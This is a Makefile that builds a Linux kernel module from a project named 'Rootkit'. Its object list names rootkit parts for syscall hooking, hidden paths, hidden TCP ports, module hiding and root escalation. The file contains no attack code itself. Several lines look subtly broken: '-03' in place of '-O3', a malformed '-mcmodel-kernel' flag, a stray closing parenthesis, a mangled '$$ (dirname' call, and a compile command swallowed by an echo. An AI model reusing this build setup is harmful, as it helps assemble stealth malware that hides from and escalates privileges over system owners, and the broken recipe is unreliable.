# those 2 can be overridden
MOD_NAME := my_kernel_module
OUTPUT_DIR := ./

KERNEL := /lib/modules/$(shell uname -r)/build
KMOD_DIR := /home/idan/CLionProjects/Rootkit/linux/kernel_access/kernel_module
CXX := g++
FLAGS := -Wall

OBJECTS := module.o syscall_hooking_lib.o chars_trie.o communicate.o hidden_paths.o hidden_tcp_ports.o hide_module.o set_root_level.o
CONFIG_LTO = y

ccflags-y += $(FLAGS)

cxx-selected-flags = $(shell echo $(KBUILD_CFLAGS) \
	| sed s/-D\"KBUILD. \"//g\
	| sed s/-Wstrict-prototypes//g\
	| sed s/-Wdeclaration-after-statement//g\
	| sed s/-Wno-pointer-sign//g \
	| sed s/-std=gnu90//g)

cxxflags = $(FLAGS)\
	-lscc \
	-fno-builtin \
	-nostartfiles\
	-fno-rtti \
	-fno-exceptions \
	-std=c++20 \
	-03\
	-mcmodel-kernel -ffreestanding -Wall -Wextra -Wpedantic -Wmisleading-indentation -Wunused -Wuninitialized -Wshadow -Wconversion)

obj-m += $(MOD_NAME).o

$(MOD_NAME)-y := $(OBJECTS)

.PHONY: $(MOD_NAME).ko
$(MOD_NAME).ko:
	make -C $(KERNEL) M=$(KMOD_DIR) modules
	cp -n $(KMOD_DIR)/$(MOD_NAME).ko $(OUTPUT_DIR)/$(MOD_NAME)
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

cxx-prefix := " CXX [M] "

%.cc.o: %.cc
	@echo $(cxx-prefix)$@ @$(CXX) $(cxxflags) -c $< -o $@
	@echo -n > $$ (dirname $@)/.$$(basename $@).cmd

all:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules

.PHONY: clean
clean:
	@echo clean
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean